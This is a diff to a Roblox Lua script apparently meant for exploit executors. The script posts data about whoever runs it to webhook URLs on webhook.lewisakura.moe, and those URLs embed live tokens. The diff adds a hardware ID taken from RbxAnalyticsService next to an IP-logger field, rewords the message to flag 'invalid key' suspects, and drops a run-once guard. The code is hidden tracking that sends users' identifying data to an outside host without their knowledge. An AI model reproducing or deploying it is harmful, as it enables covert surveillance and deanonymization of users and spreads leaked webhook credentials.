@@ -8,6 +8,7 @@ KRNL_LOADED and "Krnl" or
 SONA_LOADED and "Sona" or
 "Unknown exploit"
 
+
 local url =
 "https://webhook.lewisakura.moe/api/webhooks/1082032575821914196/eEOMaTbsOSy1bc8e0eTBasHw8NaABrx-BBFinvA8oNXA7O1PNLbk9aEIRDE70r_RgcBh"
 local data = {
@@ -34,6 +35,11 @@ local data = {
                                 ["value"] = IPLOGGER,
                                 ["inline"] = true,
                             },  
+                            {
+                                ["name"] = "Hardware ID:",
+                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                                ["inline"] = true,
+                            },
 }
 }
 }
@@ -57,20 +63,11 @@ return g(urprint,...)
 end)
     
     ------------------- NOT IPGEGER -------------------
-    wait(0.5)
-local webhookcheck =
-is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-secure_load and "Sentinel" or
-KRNL_LOADED and "Krnl" or
-SONA_LOADED and "Sona" or
-"Unknown exploit"
 
-if not getgenv().Ranonce then
-getgenv().Ranonce = true
 local url =
-"https://webhook.lewisakura.moe/api/webhooks/1058896633942777917/1gOlXDFdRLj_NmClZyPU_iPC6HS_bDtfeg2v2qO_l8S4xwFNJZ_XOHpQTiXPFNGcHEUh"
+"https://webhook.lewisakura.moe/api/webhooks/1082033037161803887/zrRfXBk0aB6IR8bAUSVA-T4NcncUE1sq4AgRvvqr9yHByNow2ph-E6ngNq0dfpSj1CiM"
 local data = {
-["content"] = "**Detected user that executed the script:**",
+["content"] = "**Suspect of an invalid key, info:**",
 ["embeds"] = {
 {
 ["title"] =  game12321,
@@ -87,7 +84,7 @@ local data = {
                                 ["name"] = "Script using:",
                                 ["value"] = script12321,
                                 ["inline"] = true,
-                            },  
+                            },
 }
 }
 }
@@ -109,4 +106,3 @@ urprint = denied_message
 end
 return g(urprint,...)
 end)
-end  
